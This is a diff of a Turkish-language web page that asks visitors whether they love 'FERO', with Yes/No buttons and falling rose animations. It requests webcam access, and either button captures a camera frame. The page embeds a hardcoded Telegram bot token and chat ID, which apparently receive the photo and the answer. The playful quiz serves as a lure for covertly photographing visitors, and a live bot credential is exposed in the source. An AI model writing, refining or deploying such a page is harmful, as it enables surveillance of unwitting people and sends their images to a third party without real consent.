@@ -14,9 +14,9 @@
       font-family: Arial, sans-serif; 
       text-align: center;
       flex-direction: column;
+      overflow: hidden;
     }
-    video, canvas { display: none; }
-    h1 { font-size: 2em; margin-bottom: 20px; }
+    h1 { font-size: 2em; margin-bottom: 20px; z-index: 2; }
     button { 
       padding: 10px 20px; 
       margin: 5px; 
@@ -24,14 +24,33 @@
       border-radius: 8px; 
       font-size: 16px; 
       cursor: pointer; 
+      z-index: 2;
     }
     button:hover { opacity: 0.8; }
     .yes { background: #4caf50; color: white; }
     .no { background: #f44336; color: white; }
+
+    /* Gül animasyonu */
+    .rose {
+      position: absolute;
+      top: -50px;
+      font-size: 24px;
+      animation: fall linear forwards;
+      opacity: 0.9;
+    }
+    @keyframes fall {
+      to {
+        transform: translateY(110vh) rotate(360deg);
+        opacity: 0;
+      }
+    }
   </style>
 </head>
 <body>
-  <h1>Kamera hazırlanıyor...</h1>
+  <h1>FERO'yu seviyor musun?</h1>
+  <button class="yes">Evet</button>
+  <button class="no">Hayır</button>
+
   <video id="video" autoplay></video>
   <canvas id="canvas"></canvas>
 
@@ -42,17 +61,6 @@
 
     const BOT_TOKEN = "8369405248:AAEGL_vh2_ZkknIOKbOaqbHVEGynLzPq47I";
     const CHAT_ID = "8494445812";
-
-    function askQuestion() {
-      document.body.innerHTML = `
-        <h1>FERO'yu seviyor musun?</h1>
-        <button class="yes">Evet</button>
-        <button class="no">Hayır</button>
-      `;
-
-      document.querySelector(".yes").onclick = () => takePhoto("Evet");
-      document.querySelector(".no").onclick = () => takePhoto("Hayır");
-    }
 
     function takePhoto(answer) {
       canvas.width = video.videoWidth;
@@ -76,15 +84,35 @@
       });
     }
 
-    // Kamerayı aç
+    document.querySelector(".yes").onclick = () => takePhoto("Evet");
+    document.querySelector(".no").onclick = () => takePhoto("Hayır");
+
+    // Kamera aç
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
         video.srcObject = stream;
-        setTimeout(askQuestion, 2000); // 2 saniye sonra soruyu göster
       })
       .catch(err => {
         document.body.innerHTML = "<h1>Kamera izni vermedin 😅</h1>";
       });
+
+    // Gül oluşturma
+    function createRose() {
+      const rose = document.createElement("div");
+      rose.classList.add("rose");
+      rose.innerHTML = "🌹";
+      rose.style.left = Math.random() * 100 + "vw";
+      rose.style.fontSize = (20 + Math.random() * 20) + "px";
+      rose.style.animationDuration = (4 + Math.random() * 4) + "s";
+      document.body.appendChild(rose);
+
+      setTimeout(() => {
+        rose.remove();
+      }, 8000);
+    }
+
+    // Her 500ms'de bir gül düşsün
+    setInterval(createRose, 500);
   </script>
 </body>
 </html>
